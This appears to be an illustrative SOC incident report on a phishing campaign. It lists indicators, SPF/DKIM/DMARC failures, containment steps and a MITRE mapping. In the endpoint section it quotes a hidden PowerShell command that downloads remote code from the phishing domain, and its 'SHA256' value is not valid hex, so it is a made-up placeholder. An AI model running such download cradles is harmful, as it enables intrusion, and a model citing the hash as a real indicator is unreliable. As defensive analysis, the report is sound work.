# 🛡️ SOC Incident Investigation: Phishing Email & Artifact Analysis

---

## 📋 1. Executive Summary
* **Investigator Profile:** Najeeb Ahmed (Aspiring SOC Analyst)
* **Severity Level:** `HIGH (P1 Incident Matrix)`
* **Triage Status:** **True Positive** (Remediated via Account Revocation)
* **Core Objective:** Investigated a social engineering phishing attack targeting internal corporate employees using domain spoofing, credential harvesting links, and malicious macro-enabled attachments.

---

## 🔍 2. Artifacts & Indicators of Compromise (IoCs) Extracted

| Artifact Element | Extracted Value / Metadata Signature |
| :--- | :--- |
| **Sender Domain** | `secure-update@microsoft-security-portal.ru` |
| **Spoofed Display Name** | Microsoft Security Core Team |
| **Extracted Phishing Link** | `http://microsoft-compromised-login.space` |
| **Attachment Name** | `Urgent_Update_2026.docm` |
| **Attachment SHA256** | `a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7` |

---

## 🧠 3. Core Investigation Steps & Header Auditing

### A. Email Gateway Authentication Check
By analyzing the raw email headers inside the Secure Email Gateway (SEG) logs, severe security compliance failures were observed:
- **SPF (Sender Policy Framework):** `FAIL` (The sending IP address was not authorized by the legitimate owner domain).
- **DKIM (DomainKeys Identified Mail):** `FAIL / NONE` (Cryptographic signature validation failed).
- **DMARC Compliance:** `REJECT` Mode Triggered.

### B. Endpoint Behavioral Tracking (Sysmon Event ID 1)
Upon tracking the user's endpoint activity after interacting with the mail attachment, the process tree flagged a major execution anomaly:
* **Parent Image:** `C:\Program Files\Microsoft Office\Office16\winword.exe`
* **Child Image:** `C:\Windows\System32\powershell.exe`
* **Command Line Argument:** `powershell.exe -nop -w hidden -c (New-Object Net.WebClient).DownloadString('http://microsoft-compromised-login.space')`
* *Analysis:* The usage of automated macros inside the document forced Microsoft Word to launch a hidden background PowerShell instance to fetch remote tools without the user's realization.

---

## 🛠️ 4. Containment & Remediation Actions Executed
1. **Host Isolation:** Isolated the victim endpoint workstation from the enterprise local area network using the EDR dashboard.
2. **Credential Invalidation:** Force-expired all active sessions and tokens for the compromised corporate active directory user profile.
3. **Gateway Block:** Permanently blacklisted the Russian external sender domain and the credential harvesting link at the border perimeter firewall.

---

## 📊 5. Reference Matrix Mapping
* **MITRE ATT&CK Tactic:** `TA0001 - Initial Access`
* **MITRE ATT&CK Technique ID:** `T1566` (Phishing)
